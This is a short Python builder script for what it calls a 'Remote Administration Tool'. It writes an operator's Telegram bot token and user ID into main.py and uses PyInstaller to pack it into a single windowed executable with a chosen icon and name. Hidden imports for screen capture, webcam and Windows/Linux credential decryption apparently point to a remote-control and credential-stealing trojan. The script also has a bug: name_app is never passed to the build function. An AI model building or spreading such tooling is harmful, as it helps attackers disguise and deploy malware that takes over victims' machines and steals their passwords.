import os
import re
import subprocess

def update_main_py(bot_token, user_id):
    try:
        with open("main.py", "r", encoding="utf-8") as file:  # Fix: Use UTF-8 encoding
            content = file.read()

        # Replace BOT_TOKEN and USER_ID
        content = re.sub(r'BOT_TOKEN\s*=\s*".*?"', f'BOT_TOKEN = "{bot_token}"', content)
        content = re.sub(r'USER_ID\s*=\s*\d+', f'USER_ID = {user_id}', content)

        with open("main.py", "w", encoding="utf-8") as file:  # Fix: Use UTF-8 encoding
            file.write(content)
        return True
    except Exception as e:
        print(f"❌ Error updating main.py: {e}")
        return False

def build_executable(icon_path):
    if not icon_path.endswith('.ico'):
        print("❌ Icon must be a .ico file.")
        return False
    if not os.path.exists(icon_path):
        print(f"❌ Icon file not found: {icon_path}")
        return False

    command = [
        "pyinstaller",
        "--onefile",
        "--windowed",
        "--name", name_app,
        "--icon", icon_path,
        "--hidden-import=telebot",
        "--hidden-import=cv2",
        "--hidden-import=numpy",
        "--hidden-import=pyautogui",
        "--hidden-import=PIL",
        "--hidden-import=pycryptodome",
        "--hidden-import=win32crypt",
        "--hidden-import=pycryptodomex",
        "--hidden-import=secretstorage",
        "--hidden-import=cryptography",
        "main.py"
    ]

    print("\n🛠️ Building executable with PyInstaller...")
    try:
        subprocess.run(command, check=True)
        print("\n✅ Success! Executable created in the 'dist' folder.")
        return True
    except subprocess.CalledProcessError as e:
        print(f"❌ PyInstaller failed: {e}")
        return False

def main():
    print("\n🔹 Remote Administration Tool Setup 🔹")
    bot_token = input("Enter your Bot Token: ").strip()
    user_id = input("Enter your User ID: ").strip()
    icon_path = input("Enter the path to your .ico file: ").strip()
    name_app = input("Enter the application name: ").strip()

    # Update main.py (with UTF-8 encoding fix)
    if update_main_py(bot_token, user_id):
        print("\n✅ main.py updated successfully!")
    else:
        print("\n❌ Failed to update main.py. Check if the file exists and is accessible.")
        return

    # Build executable
    build_executable(icon_path)

if __name__ == "__main__":
    main()
